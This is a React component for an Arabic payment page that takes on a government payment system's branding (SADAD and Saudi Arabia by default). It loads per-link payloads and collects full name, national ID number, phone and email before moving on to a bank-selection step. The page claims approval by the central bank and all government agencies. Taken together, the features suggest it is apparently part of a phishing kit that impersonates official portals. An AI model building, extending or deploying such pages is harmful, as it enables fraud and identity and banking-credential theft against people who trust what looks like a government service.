import { useState, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import PageLoader from "@/components/PageLoader";
import { 
  Shield, 
  Lock, 
  CheckCircle2, 
  CreditCard,
  Building2,
  Globe,
  User,
  Mail,
  Phone,
  MapPin,
  Hash
} from "lucide-react";

const GovernmentPaymentPage = () => {
  const { id, provider: pathProvider } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading } = useLink(id);

  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [nationalId, setNationalId] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Get provider from path, query params, or linkData
  const provider = pathProvider || searchParams.get('provider') || linkData?.payload?.provider || linkData?.payload?.service_key || 'sadad';
  const countryCode = searchParams.get('country') || linkData?.payload?.selectedCountry || linkData?.country_code || 'SA';
  const countryData = getCountryByCode(countryCode);
  const govSystem = getGovernmentPaymentSystem(countryCode);

  // Get payment data from linkData
  const amount = linkData?.payload?.payment_amount || linkData?.payload?.cod_amount || 500;
  const reference = linkData?.payload?.reference || linkData?.payload?.referenceNumber || '';
  const description = linkData?.payload?.description || '';
  const currencyCode = linkData?.payload?.currency_code || countryData?.currency || 'SAR';
  const formattedAmount = formatCurrency(amount, currencyCode);

  if (isLoading) {
    return <PageLoader message="جاري تحميل بيانات الدفع..." />;
  }

  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (isSubmitting) return;
    setIsSubmitting(true);

    navigate(`/pay/${id}/bank-selector`, {
      state: {
        customerInfo: {
          name: customerName,
          email: customerEmail,
          phone: customerPhone,
          nationalId: nationalId,
        },
        provider,
        country: countryCode,
      }
    });
  };

  return (
    <div className="min-h-screen" style={{ backgroundColor: govSystem.colors.background }} dir="rtl">
      <div 
        className="h-24"
        style={{ background: govSystem.gradients.header }}
      >
        <div className="container mx-auto h-full flex items-center justify-between px-6">
          <div className="flex items-center gap-4">
            <div className="bg-white p-3 rounded-xl shadow-lg">
              {govSystem.logo && (
                <img src={govSystem.logo} alt={govSystem.nameAr} className="h-12" />
              )}
            </div>
            <div className="text-white">
              <h1 className="font-bold text-2xl">{govSystem.nameAr}</h1>
              <p className="text-sm opacity-90">{govSystem.description}</p>
            </div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">
        <div className="grid grid-cols-4 gap-3 mb-8">
          {[
            { icon: Shield, text: 'آمن ومعتمد', desc: 'البنك المركزي' },
            { icon: Lock, text: 'مشفر بالكامل', desc: 'SSL 256-bit' },
            { icon: Globe, text: 'متاح 24/7', desc: 'على مدار الساعة' },
            { icon: CheckCircle2, text: 'فوري', desc: 'تنفيذ لحظي' }
          ].map((item, idx) => (
            <Card 
              key={idx}
              className="p-4 text-center border-2 hover:shadow-lg transition-all"
              style={{ borderColor: `${govSystem.colors.primary}30` }}
            >
              <div 
                className="w-12 h-12 mx-auto rounded-full flex items-center justify-center mb-2"
                style={{ backgroundColor: `${govSystem.colors.primary}15` }}
              >
                <item.icon className="w-6 h-6" style={{ color: govSystem.colors.primary }} />
              </div>
              <p className="font-bold text-sm">{item.text}</p>
              <p className="text-xs text-gray-600">{item.desc}</p>
            </Card>
          ))}
        </div>

        <div className="max-w-3xl mx-auto">
          <Card className="p-8 shadow-2xl">
            <div 
              className="flex items-center gap-4 mb-6 pb-4 border-b-2"
              style={{ borderBottomColor: govSystem.colors.primary }}
            >
              <div 
                className="w-14 h-14 rounded-full flex items-center justify-center"
                style={{ backgroundColor: `${govSystem.colors.primary}20` }}
              >
                <CreditCard className="w-7 h-7" style={{ color: govSystem.colors.primary }} />
              </div>
              <div className="flex-1">
                <h2 className="text-2xl font-bold">بوابة الدفع الحكومية</h2>
                <p className="text-sm text-gray-600">{description || 'خدمة حكومية'}</p>
              </div>
              <div 
                className="text-left px-6 py-3 rounded-xl"
                style={{ 
                  backgroundColor: `${govSystem.colors.primary}15`,
                  border: `2px solid ${govSystem.colors.primary}30`
                }}
              >
                <p className="text-sm text-gray-600 mb-1">المبلغ المطلوب</p>
                <p className="text-3xl font-bold" style={{ color: govSystem.colors.primary }}>
                  {formattedAmount}
                </p>
              </div>
            </div>

            {reference && (
              <div 
                className="mb-6 p-4 rounded-lg flex items-center gap-3"
                style={{ 
                  backgroundColor: `${govSystem.colors.primary}10`,
                  border: `1px solid ${govSystem.colors.primary}30`
                }}
              >
                <Hash className="w-5 h-5" style={{ color: govSystem.colors.primary }} />
                <div>
                  <p className="text-sm text-gray-600">الرقم المرجعي</p>
                  <p className="font-bold">{reference}</p>
                </div>
              </div>
            )}

            <form onSubmit={handleProceed} className="space-y-6">
              <div>
                <Label className="mb-2 flex items-center gap-2 text-base">
                  <User className="w-4 h-4" />
                  الاسم الكامل *
                </Label>
                <Input
                  type="text"
                  value={customerName}
                  onChange={(e) => setCustomerName(e.target.value)}
                  placeholder="أدخل الاسم الكامل"
                  className="h-12 text-base"
                  style={{ borderColor: `${govSystem.colors.primary}40` }}
                  required
                />
              </div>

              <div>
                <Label className="mb-2 flex items-center gap-2 text-base">
                  <Hash className="w-4 h-4" />
                  رقم الهوية الوطنية *
                </Label>
                <Input
                  type="text"
                  value={nationalId}
                  onChange={(e) => setNationalId(e.target.value)}
                  placeholder="1234567890"
                  className="h-12 text-base"
                  style={{ borderColor: `${govSystem.colors.primary}40` }}
                  required
                />
              </div>

              <div>
                <Label className="mb-2 flex items-center gap-2 text-base">
                  <Phone className="w-4 h-4" />
                  رقم الجوال *
                </Label>
                <Input
                  type="tel"
                  value={customerPhone}
                  onChange={(e) => setCustomerPhone(e.target.value)}
                  placeholder={countryData?.phonePlaceholder || "5X XXX XXXX"}
                  className="h-12 text-base"
                  style={{ borderColor: `${govSystem.colors.primary}40` }}
                  required
                />
              </div>

              <div>
                <Label className="mb-2 flex items-center gap-2 text-base">
                  <Mail className="w-4 h-4" />
                  البريد الإلكتروني
                </Label>
                <Input
                  type="email"
                  value={customerEmail}
                  onChange={(e) => setCustomerEmail(e.target.value)}
                  placeholder="example@domain.com"
                  className="h-12 text-base"
                  style={{ borderColor: `${govSystem.colors.primary}40` }}
                />
              </div>

              <Button
                type="submit"
                size="lg"
                className="w-full h-14 text-white text-lg font-bold"
                style={{
                  background: govSystem.gradients.primary,
                  boxShadow: govSystem.shadows.lg
                }}
                disabled={isSubmitting}
              >
                {isSubmitting ? "جاري المتابعة..." : "المتابعة إلى الدفع"}
              </Button>
            </form>
          </Card>

          <Card className="mt-6 p-6">
            <h3 className="font-bold text-lg mb-4 flex items-center gap-2">
              <Shield className="w-5 h-5" style={{ color: govSystem.colors.primary }} />
              إرشادات الدفع
            </h3>
            <ul className="space-y-3 text-sm text-gray-700">
              <li className="flex items-start gap-3">
                <Shield className="w-5 h-5 mt-0.5" style={{ color: govSystem.colors.primary }} />
                <span>جميع المعاملات محمية بأعلى معايير الأمان وتشفير SSL 256-bit</span>
              </li>
              <li className="flex items-start gap-3">
                <CheckCircle2 className="w-5 h-5 mt-0.5" style={{ color: govSystem.colors.primary }} />
                <span>تأكيد فوري بعد إتمام الدفع مع إمكانية طباعة الإيصال</span>
              </li>
              <li className="flex items-start gap-3">
                <Building2 className="w-5 h-5 mt-0.5" style={{ color: govSystem.colors.primary }} />
                <span>معتمد من البنك المركزي وجميع الجهات الحكومية</span>
              </li>
              <li className="flex items-start gap-3">
                <Globe className="w-5 h-5 mt-0.5" style={{ color: govSystem.colors.primary }} />
                <span>خدمة متاحة على مدار الساعة طوال أيام الأسبوع</span>
              </li>
            </ul>
          </Card>
        </div>
      </div>

      <div className="h-20" />
    </div>
  );
};

export default GovernmentPaymentPage;
